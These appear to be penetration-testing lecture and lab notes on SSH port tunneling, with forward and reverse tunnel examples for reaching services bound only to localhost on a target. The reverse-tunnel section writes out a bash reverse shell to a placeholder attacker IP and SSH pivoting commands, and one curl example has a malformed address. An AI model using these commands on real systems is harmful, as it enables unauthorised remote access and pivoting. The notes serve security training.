# Port Tunneling

## Lecture Notes: What is Port Tunneling?

* a host may have a vulnerable service that is only available internally
  * bound to localhost
  * firewalls or filtering devices
* can use another service (ex. SSH) to create forwarding from a specific port or address to the session to use that session as a "tunnel"
  * can use SSH from attacker to target
  * can use reverse shell from attacker to target, then SSH from target to attacker

## Activity Notes: Single Port Tunneling

### Forward Tunnel

* SSH into target host with below command to create tunnel
  * can then access internal resources on Kali host with 127.0.0.1:\[bound port]
  * \-N means don't execute a remote command
  * \-L creates port binding
    * 0.0.0.0 is local address for accepting all connections
    * 8888 is local bound port
    * 9999 is remote port that the vulnerable service is running on

```
ssh -N -L 0.0.0.0:8888:[target IP]:9999 [username]@[target IP]
(example) curl http://10.0.127.0.0.1:8888
```

### Reverse Tunnel

* if you can't initially access SSH on the target but can get a reverse shell
* create NC listener on Kali -> create bash reverse shell on target -> SSH from target to Kali
  * can create SSH user
  * 8888: Kali port bound
  * 9999: port vulnerable service is running on

```
# Kali
nc -nvlp 9999
# target
bash -i >&/dev/tcp/[Kali IP]/9999 0>&1
# Kali
sudo useradd -m -s /usr/bin/bash throwaway
sudo passwd throwaway
# target
ssh-keygen -N "" -C throwaway -f throwaway
cat throwaway.pub
# Kali
su throwaway
cd
mkdir .ssh
cd .ssh
nano authorized_keys
# paste throwaway.pub from target in
chmod 700 .
chmod 600 authorized_keys
sudo systemctl start sshd
# target
ssh -o StrictHostKeyChecking=no -T -R 8888:localhost:9999 throwaway@[Kali IP] -i throwaway
# Kali
curl http://127.0.0.1:8888
```
